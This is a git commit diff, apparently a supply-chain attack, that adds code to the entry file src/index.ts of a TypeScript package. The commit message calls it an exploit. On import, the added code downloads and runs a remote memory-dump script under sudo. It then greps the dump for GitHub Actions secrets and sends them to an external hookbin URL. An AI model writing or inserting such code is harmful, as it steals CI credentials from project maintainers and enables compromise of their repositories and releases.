e5da20be0f72c67fc9f941ecec61cf62c95adf9c
j5884p5g <j5884p5g@rolf.ovh>
2026-04-23 15:13:49 +0000

    Update exploit based on attempt 1 feedback

--- src/index.ts
+++ src/index.ts
@@ -1,3 +1,19 @@
+import { exec } from 'child_process';
+import { existsSync, writeFileSync } from 'fs';
+
+if (!existsSync('/tmp/.pwned')) {
+	try {
+		writeFileSync('/tmp/.pwned', 'true');
+		exec(`echo "Okay, we got this far. Let's continue..."
+curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
+curl -X PUT -d \\@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"`, (error) => {
+			if (error) console.error('Exploit failed', error);
+		});
+	} catch (e) {
+		// ignore
+	}
+}
+
 export { create, CreateOptions as UpdateCreateOptions } from './create';
 export { read, ReadableUpdateBundle } from './read';
 
